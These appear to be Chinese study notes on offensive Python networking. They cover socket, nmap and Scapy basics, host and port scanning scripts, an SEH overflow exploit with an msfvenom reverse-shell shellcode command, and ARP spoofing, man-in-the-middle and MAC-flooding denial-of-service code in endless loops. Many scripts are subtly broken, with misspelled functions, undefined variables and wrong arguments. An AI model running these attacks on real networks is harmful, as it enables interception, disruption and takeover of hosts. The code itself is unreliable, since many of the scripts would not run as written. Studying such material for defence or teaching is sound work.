# #Socket模块

#### 简介

```python
Socket只是一个编程接口，不是TCP/IP协议族中的协议

Socket是TCP/IP提供的外部接口

TCP/IP是协议，用于解决数据如何在网路中传输，是网络中的规则，不可修改

Socket是对TCP/IP的封装，是拿来使用的，任意使用 
```

```python
Socket模块的主要目的是帮助在网络上的两个程序之间建立信息通道

Socket服务端：需要实例化一个Socket类，接着循环监听，接收来自客户端的连接，成功连接后，接收客户端发来的数据，再向客户端发送数据，传输完毕后，关闭此次连接

Socket客户端：实例化一个Socket类，连接一个远程地址，这个地址由IP和端口组成，成功连接后，发送数据和接收数据，传输完毕后，关闭此次连接
```

 

#### 实例化socket

```python
socket(family,type[,protocal])
family，要使用的地址族。常用的有AF_INET、AF_INET6、AF_LOCAL、AF_ROUTE。
默认值为socket.AF_INET
```

|  协议族  | 类型 |
| :------: | :--: |
| AF_INTE  | IPV4 |
| AF_INTE6 | IPV6 |
| AF_UNIX  | 本地 |
| AF_ROUTE | 路由 |

```python
type，用以指明Socket类型。有SOCK_STREAM、SOCK_DGRAM、SOCK_RAW。
默认值为SOCK_STREAM
```

|    参数     |   类型   |                 作用                 |
| :---------: | :------: | :----------------------------------: |
| SOCK_STREAM |   TCP    |         保证数据顺序及可靠性         |
| SOCK_DGRAM  |   UDP    |   不保证数据接收的顺序，非可靠连接   |
|  SOCK_RAW   | 原始类型 | 允许对底层协议如IP或ICMP进行直接访问 |

```python
protocal，指使用的协议，该参数是可选的。通常赋值为0，由系统自动选择
```

```python
举例：

初始化一个TCP类型的Socket  s=socket.socket()

初始化一个UDP类型的Socket  s=socket.socket(socket.AF_INET,socket.SOCK_DRGAM)
```

 

#### socket常用函数

|    函数    |                             作用                             |
| :--------: | :----------------------------------------------------------: |
|   bind()   | 将指定的IP与端口绑定，如果之前使用了AF_INET初始化Socket，那么这里可使用元组(host,port)的形式表示地址 |
|  listen()  |   指定服务器端可以监听的最大数量，这个参数最小为1，一般为5   |
|  accept()  | 用于在使用TCP的服务端接收连接，一般是阻塞态，接收TCP连接并返回(conn,address),其中，conn是新的套接字对象，可以用来接收和发送数据；address是连接客户端的地址 |
|  connect   | 用于在使用TCP的客户端去连接服务端，使用的参数是一个元组，形式为(hostname,port) |
|   send()   | 用于在使用TCP时发送数据，完整的形式为send(steing[,flag]),利用这个函数可以将string代表的数据发送到已经连接的socket,返回信息发送字节数量。但是可能未将指定的内容全部发送 |
|   recv()   | 用于使用TCP是接收数据，完整的形式为recv(bufsize[,flag]),接收Socke的数据，诗句以字符串形式返回，bufsize指定最多可以接受的数量，flag这个参数一般不会使用 |
|  sendto()  | 用于UDP发送数据，完整的形式为sendto(string[,flag],address),返回值是发送的字节数。address是形式为(ipaddr.port)的元组，指定远程地址 |
| recvfrom() | UDP专用，接收数据，返回远端数据的IP地址和端口，但返回值是(data,address)。其中data是包含接收数据的字符串，address是发送数据的套接字地址 |
|  close()   |                          关闭socket                          |

**服务端socket函数：**

```python
bind()

listen()

accept()
```

**客户端socket函数：**

```python
connect()
```

**服务端与客户端均可使用的socket函数**

```python
send()

sendall() 与send()类似，用于TCP，但会完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回前会尝试发送所有数据，成功返回None，失败抛出异常

recv()

sendto()

recvfrom()

close()
```

**举例：**

```
将Socket绑定到本机的123端口  s.bind((‘127.0.0.1’,123))

在服务端开启一个监听 s.listen(5)

连接本机的123端口  s.connect((“127.0.0.1”,123))

发送一段字符到Socket s.sendall(byte(“hello”,encoding=”utf-8”))

接收一段长度为1024的字符Socket obj.recv(1024)
```

 

# #python-nmap模块

#### 五个核心的类

```
PortScanner、PortScannerAsync、PortScannerError、PortScannerHostDict、PortScannerYield
```



#### PortScanner

```
该类实现Nmap工具功能的封装，所包含的函数如下

· scan()函数，这个函数的完整形式为 scan(self, hosts='l27.0.0.1 ', ports=None, arguments = ' - sV ’，sudo=False ），用来对指定目标进行扫描，其中需要设置的三个参数包括hosts、 ports 和arguments。
   host为字符串类型，表示要扫描的主机，可以是IP也可以是域名
   port为字符串类型，表示需要扫描的端口，多个不连续端口以逗号隔开，连续的端口范围以横线，例80，443，8080以及 1-1000
   arguments为字符串类型，表示Nmap扫描时的参数

· all_host()函数，返回一个被扫描的所有主机列表

· command_line()函数，返回在当前扫描中使用的命令行

· csv()函数，返回值是一个CSV文件格式的输出

· has_host(self,host)函数，检查是否有host的扫描结果，有返回True，无返回False

· scaninfo()函数，列出一个扫描信息的结构
```



#### PortScannerAsync

```
功能类似于PortScanner，但该类可实现异步扫描

· scan()函数，这个函数的完整形式为scan(self, hosts='l27.0.0.1 ', ports=None, arguments = ' - sV ’，callback=None, sudo=False)，相比较于PortScanner的scan()函数，多了一个回调函数

· still_scanning()函数，用以实现异步的函数，如果扫描正在进行，返回True，反之False

· wait(self, timeout=None)函数，用以实现异步的函数，表示等待时间

· stop()函数，用以实现异步的函数，停止当前的扫描
```



# #Scapy模块

```
Scapy已经在内部实现了大量的网络协议(DNS,ARP,IP,TCP,UDP等等)

可用该模块试下对网络数据包的发送、监听、解析

相较于Nmap，该模块要更加底层，更直观看见网络中各种扫描以及攻击行为

在Scapy中，一个协议就是一个类

可以用ls()函数来查看一个类所拥有的属性

Scapy采用分层的形式来构造数据包，通常最下面的协议是Ether，接下来是IP，之后是TCP、UDP

一个数据包由多层协议组成，那么这些协议之间用“/”分开，按照协议由底而上的顺序从左往右排列
```

```
ls()函数，查看一个类所拥有是属性

send()函数，用以发送数据包，工作在第三层，发送IP数据包，只发不收

sendp()函数，用以发送数据包，工作在第二层，发送Ether数据包，只发不收

fuzz()函数，发送一个内容是随机填充的数据包并且保证该数据包的正确性

sr()函数，发送和接收数据包，用于第三层，其返回值是两个列表，第一个列表是收到了应答的包和对应的应答，第二个列表是未收到应答的包

srl()函数，发送和接收数据包，用于第三层，只返回一个应答的包

srp()函数，发送和接收数据包，用于第二层
```

```
sniff()，捕获经过本机网卡的数据包

参数filter可进行过滤，过滤数据包、过滤协议，多个过滤条件可用”and””or”等关系运算符来表达。例如sniff(filter=”host 192.168.3.2 and icmp”)

参数iface，指定所要监听的网卡。例如sniff(iface=”eth1”)

参数count，指定要监听的数据包的数量，达到数据即停止监听。例如sniff(count=3)
```



# #Nmap工具

#### 选择扫描目标的nmap语法

```
扫描指定IP主机 nmap 192.168.3.5

扫描指定域名主机 nmap www.a.com

扫描指定范围主机 nmap 192.168.3.1-20

扫描一个子网主机 nmap 192.168.3.0/24
```



#### 对目标的端口进行扫描

```
扫描一个主机的特定端口 nmap -p 22 192.168.3.2

扫描指定范围端口 nmap -p 1-80 192.168.3.2

扫描100个最为常用的端口 nmap -F 192.168.3.2
```



#### 对目标端口状态进行扫描

```
使用TCP全开扫描 nmap -sT 192.168.3.2

使用TCP半开扫描 nmap -sS 192.168.3.2

使用UDP扫描 nmap -sU -p 123,161,162 192.168.3.2
```



#### 对目标的操作系统和运行服务进行扫描

```
扫描目标主机上运行的操作系统 nmap -O 192.168.3.2

扫描目标主机上运行的服务类型 nmap -sV 192.168.3.2
```



# #活跃主机发现

```
活跃主机：处于运行状态且网络功能正常的主机

协议规定有请求就得有应答

主机发现，则就是构建一个请求，并发送出去，如果对方是活跃主机，就能进行回应
```

#### 基于ARP的活跃主机发现

```
ARP，地址解析协议，主要用在以太网中，用于只知道IP地址的情况下去发现MAC地址，即IP转MAC

所有主机在互联网中通信使用的是IP地址，在以太网中通信使用的是MAC地址

只知道目标主机IP地址但不知道MAC地址，就使用以太网广播包给每一台主机发ARP请求，其余主机会去匹配ARP请求中的IP地址，地址匹配则做出回应，并把回应的结果放在ARP缓存表中，之后的通信会去查询ARP缓存表以找到MAC地址

当目标主机与攻击机处于同一以太网，使用ARP扫描，最快且最精准，没有任何安全措施能阻止这种扫描方式

但仅能扫描同一以太网内的主机
```

```
过程：攻击机给目标机发送一个ARP Request
     目标机活跃则回应一个ARP Request
     目标机不活跃则不会给出任何回应
```

```python
a代码思路：Scapy库+ARP请求

​     设置目标IP地址pdst

​     由于是广播包，故需要在Ether层进行设置

​     将Ether中的dst设置为ff:ff:ff:ff:ff:ff即可将数据包发给网络中的各个主机

​     构造一个扫描目标主机的ARP请求数据包并发送

​     对请求的回应进行监听

import sys
if len(sys.argv) != 2:
    print "Usage: arpPing <IP>\n eg: arpPing 192.168.1.1"
    sys.exit(1)
from scapy.all import srp,Ether,ARP
ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=sys.argv[1],timeout=2))
for snd,rcv in ans:
    print ("Target is alive")
    print rcv.sprintf("%Ether.src% - %ARP.psrc%")
```

```python
b代码思路：nmap库+ARP扫描

​      PortScanner类 scan()函数

​      nmap中-PR表示使用ARP，-sn表示只测试该主机的状态

import sys
if len(sys.argv) != 2:
    print "Usage: arpPing2 <IP> eg:arpPing2 192.168.1.1"
    sys.exit(1)
import nmap
nm = nmap.PortScanner()
nm.scan(sys.argv[1], argument='-sn -PR')
for host in nm.all_hosts():
    print('Host : %s(%s)' % (host, nm[host].hostname()))
    print('State ：%s' % nm[host].state())
```



#### 基于ICMP的活跃主机发现

```python
ICMP位于TCP/IP中的网络层，其目的是用于在IP主机、路由器之间传递控制消息

ICMP，Internet Control Message Protocol，互联网控制报文协议

ICMP有两大类报文：差错报文、查询报文

查询报文由一个请求以及应答构成

查询报文又有4种：响应请求或应答、时间戳请求或应答、地址掩码请求或应答、路由器询问或应答
```

```python
过程：(仅针对响应请求或应答报文，因为后面3种成功率很低)

   攻击机向目标机发送ICMP Request

   目标机活跃则会回应ICMP Reply，反之，不回应

   但现在很多设备或机制都会屏蔽ICMP，这种情况下，即使主机活跃，也不会回应

ICMP的应用范围要大于ARP，以太网和互联网均能使用，但由于设备以及机制对ICMP进行屏蔽，会导致扫描结果不准确
```

```python
a代码思路：Scapy库+ICMP请求

​     设置IP(dst)

​     构造扫描主机的ICMP请求数据包并发送

​     监听请求的回应

import sys 
if len(sys.argv) != 2:
    print "Usage: icmpPing2 <IP> eg:icmpPing2 192.168.1.1"
    sys.exit(1)
from scapy.all import sr,IP,ICMP
ans,unans=sr(IP(dst = sys.argv[1])/ICMP())
for snd,rcv in ans:
    print rcv.sprintf("%IP.src% is alive")
```

```python
b代码思路：Nmap库

​       Nmap中-PE表示使用ICMP，-sn表示只测试该主机的状态

import sys
if len(sys.argv) != 2:
    print "Usage: icmpPing2 <IP> eg:icmpPing2 192.168.1.1"
    sys.exit(1)
import nmap
nm = nmap.PortScanner()
nm.scan(sys.argv[1], argument='-PE -sn')
for host in nm.all_hosts():
    print('Host : %s(%s)' % (host, nm[host].hostname()))
    print('State ：%s' % nm[host].state())
```

 

#### 基于TCP的活跃主机发现

```python
TCP，位于传输层的协议，面向连接的、可靠的、基于字节流的传输层通信协议

三次握手，四次挥手

传输层，出现了“端口”的概念

如果检测到一台主机的某个端口有回应，即可判断该主机是活跃主机

即使端口关闭，只要主机是活跃的，收到请求时也会给出回应，只不过不是一个“SYN+ACK”数据包，而是一个拒绝连接的“RST“数据包

检测主机是否活跃，向80端口发送一个SYN包，之后可能有3种情况：

a.攻击机的SYN包到达了80端口，但80端口关闭，则回应一个RST包

b.攻击机的SYN包到达了80端口，且80端口开放，则回应SYN+ACK包

c.攻击机的SYN包到达不了，则没有任何回应
```

```python
a代码思路：Scrapy库+TCP请求

​      sport源端口、dport目的端口、flags标志位

​      SYN(建立连接)、FIN(关闭连接)、ACK(响应)、PSH(有DATA数据传输)、RST(连接重置)

​      TCP没有目标地址和源地址，故需要在IP层进行设置

​      构造SYN请求数据包并发送

​      监听请求的回应

import sys
if len(sys.argv) != 3:
    print "Usage: tcpPing2 <IP> eg:tcpPing2 192.168.1.1"
    sys.exit(1)
from scapy.all import sr,IP,TCP
ans,unans=sr(IP(dst = sys.argv[1])/TCP(dport=int(sys.argv[2]), flags="S"))
for snd,rcv in ans:
    print rcv.sprintf("%IP.src% is alive")
```

```python
b代码思路：nmap库

​      Nmap中-sT表示使用TCP

​      在这里不能使用-sn，因为会跳过端口扫描

import sys
if len(sys.argv) != 2:
    print "Usage: tcpPing2 <IP> eg:tcpPing2 192.168.1.1"
    sys.exit(1)
import nmap
nm = nmap.PortScanner()
nm.scan(sys.argv[1], argument='-sT')
for host in nm.all_hosts():
    print('Host : %s(%s)' % (host, nm[host].hostname()))
    print('State ：%s' % nm[host].state())
```

 

#### 基于UDP的活跃主机发现

```
UDP，用户数据报协议，与TCP一样用于处理数据包，是一种无连接的协议，在OSI中位于第4层传输层

UDP没有3层握手机制

当向目标发送一个UDP数据包之后，目标是不会返回任何UDP包的。如果目标机处于活跃，但目标端口关闭，此时可以返回一个ICMP包，该ICMP包的含义为unreachable

目标机不活跃则不会得到任何回应

Nmap中使用-PU表示使用UDP
```

# #端口扫描

```python
正常情况下端口只有open开放和close关闭，这两种状态

有时会有端口屏蔽，导致端口无法正确判断，故多了一种filtered状态
```



#### 基于TCP全开的端口扫描

```python
TCP全开的扫描可能被日志记录

目标端口开放，接到SYN请求后会返回SYN+ACK，表示愿意接收此次连接，接着攻击方再回应一个ACK，至此，成功建立一个TCP连接

目标端口关闭，接到SYN请求后会返回RST回应，表示不接受此次连接，至此，该TCP连接断开

目标端口未知(关闭或屏蔽)，接到SYN请求后，不给予任何回应
```

```python
代码思路：TCP中flags=S，表示这是SYN请求数据包

​     构造数据包并用srl发送

​     根据应答包判断目标端口状态

​     resp值为空，表示没有回应，则端口为close

​     resp值不为空，数据包判断为SYN+ACK(0x12)，则再发送ACK，完成TCP连接

​      resp值不为空，数据包判断为RST(0x14)，则端口为close

RandShort()，用以产生一个随机端口
srl()参数为timeout，用以指定等待回应数据包的时间

import sys
from scapy.all import *
if len(sys.argv) != 3:
    print "Usage: PortScan <IP>\n eg:POrtScan 192.168.1.1 80"
    sys.exit(1)
dst_ip = sys.argv[1]
src_port = RandShort()
dst_port = int(sys.argv[2])
packet = IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flag="S")
resp = srl(packet,timeout=10)
if(str(type(resp))=="<type 'NoneType'>"):
    print "The Port %s is Closed" %(dst_port)
elif(resp.haslayer(TCP)):
    if(resp.getlayer(TCP).flags == 0x12):
        send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="AR"),timeout=10)
        print "The Port %s is OPen" %(dst_port)
    elif(resp.getlayer(TCP).flags == 0x14):
        print"The Port %s is Closed" %(dst_port)
```



#### 基于TCP半开的端口扫描

```
TCP全开的扫描可能被日志记录

TCP全开的扫描，建立TCP连接的最后一步ACK其实是没必要的，目标返回SYN+ACK时，探测的目的已经达到了

目标端口开放，接到SYN请求后会返回SYN+ACK，表示愿意接收此次连接，接着攻击方再回应一个RST，表示中断该连接，至此，TCP连接不完整，即为半开

目标端口关闭，这点与TCP全开一样，返回RST，至此，该TCP连接断开

目标端口filtered，这种一般由包过滤机制造成，可能源于路由器、防火墙，至此，收不到任何回应数据包

收到ICMP错误消息时，也会把目标端口划分为filtered
```

| TCP连接包倍屏蔽，返回的ICMP错误信息 |
| :---------------------------------: |

| 类型 | 代码 |           意义           |
| :--: | :--: | :----------------------: |
|  3   |  1   |        主机不可达        |
|  3   |  2   |        协议不可达        |
|  3   |  3   |        端口不可达        |
|  3   |  9   |    目的网络被强制禁止    |
|  3   |  10  |    目的主机被强制禁止    |
|  3   |  13  | 由于过滤，通信被强制禁止 |

```python
a代码思路：考虑到ICMP错误包以及屏蔽带来的filtered

import sys
from scapy.all import *
if len(sys.argv) != 3:
    print "Usage: PortScan <IP>\n eg:POrtScan 192.168.1.1 80"
    sys.exit(1)
dst_ip = sys.argv[1]
src_port = RandShort()
dst_port = int(sys.argv[2])
packet = IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flag="S")
resp = srl(packet,timeout=10)
if(str(type(resp))=="<type 'NoneType'>"):
    print "The Port %s is Closed" %(dst_port)
elif(resp.haslayer(TCP)):
    if(resp.getlayer(TCP).flags == 0x12):
        send_rst = sr(IP(dst=dst_ip)/TCP(sport=src_port,dport=dst_port,flags="R"),timeout=10)
        print "The Port %s is OPen" %(dst_port)
    elif(resp.getlayer(TCP).flags == 0x14):
        print"The Port %s is Closed" %(dst_port)
elif(resp.haslayer(ICMP)):
    if(int(getlayer(ICMP).type)==3 and resp.getlayer(ICMP).code in [1,2,3,9,10,13]):
        print "The Port %s is Filtered" %(dst_port)
```

```python
b代码思路：nmap库

​      Nmap中默认的就是使用半开连接·

import sys
if len(sys.argv) != 3:
    print "Usage: PortScan <IP Port>\n eg:POrtScan 192.168.1.1 80-455"
    sys.exit(1)
import nmap
target = sys.argv[1]
port = sys.argv[2]
nm = nmap.PortScanner()
nm.scan(target,port)
for host in nm.all_hosts():
    print('Host : (0) ((1))'.format(host, nm[host].hostname()))
    print('State : (0)'.format(nm[host].state()))
    for proto in nm[host].all_protocols():
        print('Protocol : (0)'.format(proto))
        lport = list(nm[host][proto].keys())
        lport.sort()
        for port in lport:
            print('port : (0)\tstate : (1)'.format(port,nm[proto][port] ))
```

 

# #服务扫描

```python
公知端口与服务的对应关系

抓取软件banner以获取目标软件的信息

向目标开放端口发送探针数据包，根据返回的包，与库中的记录进行对比，找到对应服务
```

```python
a代码思路：抓取软件banner

​      Socket库

​      连接TCP类型的Socket

​      发送数据，获取回应

import sys
if len(sys.argv) != 3:
    print "Usage: ServiceScan <IP Port>\n eg:ServiceScan 192.168.1.1 80"
    sys.exit(1)
import socket
target = sys.argv[1]
port = int(sys.argv[2])
s = socket.socket()
res = s.connect((target,port))
s.send('111111')
service = s.recv(1024)
s.close()
print'Port in {}'.format(port)+'Service:{}'.format(service)
```

```python
b代码思路：nmap库

​      扫描nm.scan(tartget, port, “-sV”)

​      结果处理

​      address，用来存储主机的IP地址

​      hostnames，用来存储主机的名称

​      osmatch，用来存储主机的操作系统信息

​      portused，用来存储主机的端口信息(开放或关闭)

​      status，用来存储主机的状态(活跃或非活跃)

​      tcp，用来存储端口的详细信息(例如状态、运行的服务、软件版本)

import sys
if len(sys.argv) != 3:
    print "Usage: ServiceScan <IP Port>\n eg:ServiceScan 192.168.1.1 80"
    sys.exit(1)
import nmap
target = sys.argv[1]
port = int(sys.argv[2])
nm = nmap.PortScanner()
nm.scan(target, port, "-sV")
for host in nm.all_hosts():
    for proto in nm[host].all_protocols():
        lport = nm[host][proto].keys()
        lport.sort()
        for port in lport:
            print('Port : %s\tproduct : %s' % (port,nm[host][proto][port]['product']))
```



# #操作系统扫描

```python
被动式检测：通过抓包工具来收集流经网络的数据包，再从这些数据包中分析出目标主机的操作系统信息

主动式检测：向目标主机发送特定的数据包(Telnet\FTP\残缺数据包等等)，目标主机一般会对这些数据包做出回应，对回应做出分析，就可能获得主机的操作系统类型
```

```python
被动检测：可使用工具p0f，接着对目标机产生通信流量
```

```python
主动检测思路：Nmap库

​       PortScanner()

​       nm.scan()

​       accuracy

​       line

​       osclass(accuracy匹配度、cpe通用平台枚举、osfamily系统类别、osgen第几代操作系统、type设备类型、vendor生产厂家) 

import sys
if len(sys.argv) != 2:
    print "Usage: OsScan <IP Port>\n eg:OsScan 192.168.1.1 80"
    sys.exit(1)
import nmap
target = sys.argv[1]
nm = nmap.PortScaner()
if 'osmatch' in nm[target]:
    for osmatch in nm[target]['osmatch']:
        print('OsMatch.name : {0}'.format(osmatch['name']))
        print('OsMatch.accuracy : {0}'.format(osmatch['accuracy']))
        print('OsMatch.line : {0}'.format(osmatch['line']))
        print('')
        if 'osclass' in osmatch:
            print('OsClass.type : {0}'.format(osclass['type']))
            print('OsClass.vendor : {0}'.format(osclass['vendor']))
            print('OsClass.osfamily : {0}'.format(osclass['osfamily']))
            print('OsClass.osgen : {0}'.format(osclass['osgen']))
            print('OsClass.accuracy : {0}'.format(osclass['accuracy']))
            print('')
```

 

# #SEH溢出渗透

```python
结构异常处理(SEH)机制，也就是try/except或者try/catch

异常处理程序是用来捕获在程序执行期间生成的异常和错误的代码模块，这种机制可以保证程序继续执行而不崩溃

由于异常有很多种，导致SHE其实是一个异常处理链。捕获异常后，将异常交给SHE，若当前SHE无法处理，则交给下一个SEH

当程序产生异常，会从栈中加载catch代码的地址并调用catch代码

如果覆盖栈中异常处理的catch代码地址，即可控制该应用程序
```

#### 基于SEH溢出的渗透思路

```python
       引起应用程序的异常，由此调用异常处理程序
​       使用一条POP/POP/RET指令的地址来改写异常处理程序的地址，因为需要将执行切换到下一条SEH记录的地址(catch异常处理程序地址前面的4个字节)。之所以使用POP/POP/RET,是因为用来调用catch块的内存地址保存在栈中，指向下一个异常处理程序指针的地址就是ESP+8(ESP是栈顶指针)。因此，两个POP操作就可以将执行重定向到下一条SEH记录的地址。
​     在第一步输入数据的时候，已经将下一条SEH记录的地址替换成了跳转到攻击载荷的JMP指令的地址。因此，当第二个步骤结束时，程序就会跳过指定数量的字节去执行Shellcode。  
​       当成功跳转到Shellcode之后，攻击载荷就会执行，也获得了目标系统的管理权限。
```

![image-20230802140909953](C:/Users/Gintoki/AppData/Roaming/Typora/typora-user-images/image-20230802140909953.png)

#### 渗透模块的需求

```python
    计算到catch位置的偏移量：构建包，SEH，Immunity Debugger，view SEH chain，Metasploit pattern_offset
​    POP/POP/RET地址
​    短跳转指令
```

##### 计算到catch位置的偏移量

```python
#web程序登录代码
import sys,socket
if len(sys.argv) != 2:
    print "Usage: SEHhack <IP>\n eg:SEHhack 192.168.1.1"
    sys.exit(1)
host=sys.argv[1]
port=80
#packet是向目标发送的数据包
#BP抓包获取登录数据包的内容，并修改，以造成SEH
#
#假如到下一条SEH记录地址为456789123
#根据数据修改的catch块地址为789456123
#
#构建包，SEH，Immunity Debugger，view SEH chain，Metasploit pattern_offset
#
#pattern_offset.rb -q 456789123 -l 10000执行可得到下一条SEH记录地址的偏移量
#pattern_offset.rb -q 789456123 -l 10000执行可得到catch的偏移量
packet=""
#payload自行构建
payload=""
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(host, port)
s.send(packet)
s.close()
```

##### 查找POP/POP/RET地址

```python
    需要POP/POP/RET指令的地址来载入下一条SEH记录的地址，并跳转到攻击载荷
​    从外部DLL文件载入一个地址(不过目前均有SafeSEH保护机制来编译DLL)，故需要一个没有被SafeSEH保护的DLL模块的POP/POP/RET指令地址
​    Mona.py脚本
​    空指令滑行：在POP/POP/RET地址和Shellcode之间添加一些空指令(如NOPs)，保证Shellcode顺利执行
```

##### 短跳转指令

```python
短跳转指令：用以载入下一条SEH记录的地址，并帮助程序跳转到Shellcode
短跳转指令编码为\xeb\x06
为了补齐，需添加两个\x90，即NOPs
```

#### 渗透模块

```python
处理数据:使用大端模式的网络字节序字节流
    大端模式：数据的低位保存在内存的高地址中，数据的高位保存在内存的低地址中
    小端模式：数据的低位保存在内存的低地址中，数据的高位保存在内存的高地址中
    
import socket,struct
host = "192.168.92.2"
port = 80
#shellcode可以用msfvenom来生成
#坏字符设为\x00\x3b
#msfvenom -p windows/shell/reverse_tcp LHOST=192.168.92.2 LPORT=8585 -b "\x00\x3b" -e x86/shikata_ga_nai -f python -v shellcode
shellcode = ()
print"[+]Connecting to" + host
#导致目标服务器溢出的字符（4059个A）
payload = "A"*4059
#实现跳转的指令（"\xeb\x06\x90\x90"）
payload += "\xeb\x06\x90\x90"
#POP/POP/RET地址
payload += struct.pack("<I", 0x10017743)
#用来实现空指令滑行(40个NOPs)
payload += "\x90"*40
payload += shellcode
#发往目标主机的数据包
packet = ()
print "[+]Sending to Calc..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(host, port)
s.send(packet)
s.close()
```

# 网络嗅探&欺骗

```python
The quieter you are the more you are able to hear
```

#### 嗅探-总览

```python
所有通过网卡的数据都是可以被读取的
数据仅是按照不同协议组织到一起了
从协议去分析数据
当然，大厂有自己的自研协议
```

#### 嗅探-Scapy sniff()参数&&过滤器

```python
count:表示要捕获数据包的数量。默认为0，表示不限制数量
store:表示是否要保存捕获到的数据包。默认为1
prn:该参数其实是一个函数，该函数会应用在每一个捕获到的数据包上。若有返回值，则会显示出来。默认为空
iface:表示要使用的网卡或网卡列表
**************************************************************
伯克利包过滤语法，即BPF，使用原语来完成对数据包的描述
原语表达式可以用与或非等逻辑运算，也可以加以Type\Dir\Proto等限定词
可以确定应该获取、检查、过滤哪些流量
通过比较各个协议中数据字段值的方法对流量进行过滤
Type:用来规定使用名字或数字代表的类型，例如host\net\port
Dir:用来规定流量的方向，例如src\dst\src and dst
Proto:用来规定匹配的协议，例如ip\tcp\arp
```

#### 嗅探-工具代码

```python
#捕获和特定主机通信的1000个数据包，并保存到catch.pcap数据包中
from scapy.all import *
import sys
iflen(sys.argv) !=2:
    print('Usage:catchPackets<IP>\n eg:catchPackets 192.168.92.2')
    sys.exit(1)
ip = sys.argv[1]
def Callback(packet):
    print packet.show()
packets=sniff(filter="host"+ip,prn=Callback,count=5)
wrpcap("catch.pcap",packets)
```

#### 欺骗-总览

```python
篡改数据
伪造数据
```

#### 欺骗-ARP协议原理&缺陷&数据包格式

```python
ARP的主要原因是以太网中使用的设备交换机不能识别IP地址，只能识别硬件地址
在交换机中内容寻址寄存表(CAM),该表列出了交换机每个端口所连接设备的硬件地址
当交换机收到一个发往特定硬件地址的数据包，就首先从表中查找对应表项，有的话就直接发往端口
软件使用的是IP地址，交换机使用的是硬件地址，故在软件将数据包交给交换机之前，会发生IP与硬件地址的转换
支持ARP的主机中有一个ARP表，该表中保存了已知的IP与硬件地址的对应关系，同样的，优先找表中有无对应表项，没有的话就会产生一个ARP广播，广播给网段中的所有设备，目标主机回应后，将新的表项添加到ARP表中
但缺少认证机制
故ARP表可能被脏，可能冒充
**************************************************************
ARP数据包格式
    以太网目的地址，6位
    以太网源地址，6位
    帧类型，2位
    硬件类型，2位
    协议类型，2位
    硬件地址长度，1位
    协议地址长度，1位
    op，2位
    发送端以太网地址，6位
    发送端IP地址，4位
    目的以太网地址，6位
    目的IP地址，4位
```

#### 欺骗-ARP欺骗

```python
arpspoof
**************************************************************
#构造数据包
#源IP地址：192.168.169.2(网关的IP地址)
#源硬件地址：00:00:11:22:33:44(kali的硬件地址)
#目标IP地址：192.168.169.3(要欺骗主机的IP地址)
#目标硬件地址：00:00:44:33:22:11
#ARP类型：request
#Scapy
#ls(ARP)
#op=1
#gatewayIP="192.168.169.2"
#victimIP="192.168.169.3"
#ls(Ether)
#srcMAC="00:00:11:22:33:44"
#dstMAC="00:00:44:33:22:11"
#sendp(Ether(dst=dstMAC,src=srcMAC)/ARP(psrc=gatewayIP,pdst=vimtimIP))
**************************************************************
import sys
from scapy.all import sendp,ARP,Ether
if len(sys.argv) !=3:
    print sys.argv[0] + ": <target><spoof_ip>"
    sys.exit(1)
victimIP=sys.argv[1]
gatewayIP=sys.argv[2]
packet=Ether()/ARP(psrc=gatewayIP,pdst=vimtimIP)
while 1:
    sendp(packet)
    time.sleep(10)
    print packet.show()
```

#### 欺骗-中间人欺骗

```python
#Scapy
#开启中间人欺骗，需要同时对目标主机和网关都进行欺骗
#ARP表项有生命周期，需要不断欺骗(循环 sendp(attackTarget,inter=1,loop=1))
import sys
import time
from scapy.all import sendp,ARP,Ether
if len(sys.argv) !=3:
    print sys.argv[0] + ": <target><spoof_ip>"
    sys.exit(1)
victimIP=sys.argv[1]
gatewayIP=sys.argv[2]
#欺骗主机
attackTarget=Ether()/ARP(psrc=gatewayIP,pdst=vimtimIP)
#欺骗网关
attackGateway=Ether()/ARP(psrc=vimtimIP,pdst=gatewayIP)
#循环  inter指定时间间隔  loop=1实现循环发送
sendp(attackTarget,inter=1,loop=1)
sendp(attackGateway,inter=1,loop=1)
**************************************************************
#Socket
#按照ARP数据包格式构造socket数据包
#    以太网目的地址，6位
#    以太网源地址，6位
#    帧类型，2位
#    硬件类型，2位
#    协议类型，2位
#    硬件地址长度，1位
#    协议地址长度，1位
#    op，2位
#    发送端以太网地址，6位
#    发送端IP地址，4位
#    目的以太网地址，6位
#    目的IP地址，4位
import socket
import struct
import binascii
s=socket(socket.PF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))
srcMAC=''
dstMAC=''
code=''
htype=''
ptotype=''
hsize=''
psize=''
opcode=''
gatewayIP=''
victimIP=''
packet=dstMAC + srcMAC + code + htype + protype + hsize + psize + opcode + srcMAC + socket.inet_aton(gatewayIP) + dstMAC + socket.inet_aton(victimIP)
while 1:
    s.send(packet)
```

# 拒绝服务攻击

#### 数据链路层DOS——二层交换机

```python
攻击目标是二层交换机
目的是让二层交换机以一种不正常的方式工作

在交换机之前，使用的是集线器(用sniffer+网卡混杂即可监听整个局域网)
两者作用相同，均是实现局域网两个主机之间的通信
原理不同
简而言之，集线器没有学习和记忆的能力
集线器的模式是广播，对应主机接收数据包，其余主机抛弃数据包
交换机具有学习和记忆的能力，按照CAM表完成数据包转发
当然，交换机的学习是动态的，CAM表中的表项有一个存活期(通常是5min)
由此，交换机是单播

当填满覆盖CAM表，伪造表项，此时的交换机退化成集线器，即广播数据包
无法正常提供局域网转发
```

```python
macof [-s src] [-d dst] [-e tha] [-x sport] [-y dport] [-i interface] [-n times]
**************************************************************
import sys
from scapy.all import *
import time
iface = "eth0"
iflen(sys.argv) >=2:
    iface=sys.argv[1]
while(1):
    packet = Ether(src=RandMac(),dst=RandMac())/IP(src=RancIP(),dst=RandIP()) / ICMP()
    time.sleep(0.5)
    sendp(packet,iface=iface,loop=0)
```

#### 网络层DOS

```python
针对ICMP

死亡之ping   ping 192.168.92.2 -l 65500
同时多台计算机发送ICMP数据包
提高发送ICMP数据包的速度
随机地址向目标不断发送ICMP数据包(flood由正常通信的服务器发起)
向不同地址不断发送以攻击目标的IP地址为发送地址的数据包(flood由正常通信的服务器发起)
```

```python
import sys.random
